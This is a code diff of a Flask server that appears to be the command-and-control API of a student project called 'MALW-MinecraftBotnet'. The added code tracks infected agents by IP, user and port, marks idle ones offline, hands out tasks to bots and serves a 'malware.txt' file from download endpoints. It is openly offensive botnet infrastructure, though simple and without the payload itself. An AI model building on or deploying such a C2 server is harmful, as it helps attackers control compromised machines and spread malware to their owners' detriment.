@@ -3,13 +3,37 @@ from pymongo import MongoClient
 from bson.objectid import ObjectId
 import json
 import os
+import datetime
+from datetime import timedelta, timezone
+import threading
+import time
+
 
 app = Flask(__name__)
-
 # app.config.from_file('./secrets/config.json', load=json.load)
 DOWNLOAD_PATH = "C:/Users/Alexa/Documents/GitHub/MALW-MinecraftBotnet/API/downloads"
 # DOWNLOAD_PATH = "/home/flask_app/BotnetAPI/downloads"
 
+#Agents
+agents_dict = dict()
+
+#tasks, where the task is an url
+tasks = {"/task1": 0, "/task2": 0, "/task3": 0}
+
+def superintendent():
+    """
+    background function, scheduler and supervisor
+    """
+    for key, value in agents_dict.items():
+        difference = datetime.datetime.now() - value['last_connected']
+        print(difference.seconds//60)
+        if (difference.seconds//60) > 5:
+            print('older')
+            agents_dict[key]['status'] = "offline"
+    print(agents_dict)
+    time.sleep(5)
+    
+threading.Thread(target=superintendent).start()
 
 #### API Endpoints ####
 
@@ -22,7 +46,67 @@ def home():
 def getMalware():
     return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))
 
+@app.route('/task1', methods=['GET'])
+def getTask1():
+    #add path from static folder
+    return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))
 
+@app.route('/task2', methods=['GET'])
+def getTask2():
+    #add path from static folder
+
+    return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))
+
+@app.route('/task3', methods=['GET'])
+def getTask3():
+    #add path from static folder
+
+    return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))
+
+@app.route('/agent', methods=['POST'])
+def report_result():
+    agent_ip = request.remote_addr
+    agent_user = request.remote_user
+    #agent_last_connected = request.date
+    port = request.environ['REMOTE_PORT']
+    current_time = datetime.datetime.now()
+
+    if agent_ip not in agents_dict:
+        agents_dict[agent_ip] = {"ip": agent_ip , "user": agent_user, "last_connected": current_time, "port": port,"status": "online", "task": ""}
+        #print(agents_dict)
+    else:
+        agents_dict[agent_ip]['status'] = "online"
+        agents_dict[agent_ip]['task'] = ""
+
+    return "Thank you"
+
+
+@app.route('/agent', methods=['GET'])
+def reporting_for_duty():
+    agent_ip = request.remote_addr
+    agent_user = request.remote_user
+    #agent_last_connected = request.date
+    port = request.environ['REMOTE_PORT']
+    current_time = datetime.datetime.now()
+
+    current_task = min(tasks, key=tasks.get) #gives the key with the lowest count
+    
+    if agent_ip not in agents_dict:
+        agents_dict[agent_ip] = {"ip": agent_ip , "user": agent_user, "last_connected": current_time, "port": port,"status": "working", "task": current_task}
+        
+        tasks[current_task] += 1 # increase the count of the task since an agent is working on it
+        return current_task
+    elif agents_dict[agent_ip]['status'] != "working":
+        agents_dict[agent_ip]['status'] = "working"
+        agents_dict[agent_ip]['task'] = current_task
+
+        tasks[current_task] += 1 # increase the count of the task since an agent is working on it
+        return current_task
+    else:
+        return "Keep working grunt >:("
+
+    
 
 if __name__ == '__main__':
     app.run(host="127.0.0.1", port=80)
+    #threading.Timer(5.0, superintendent).start()
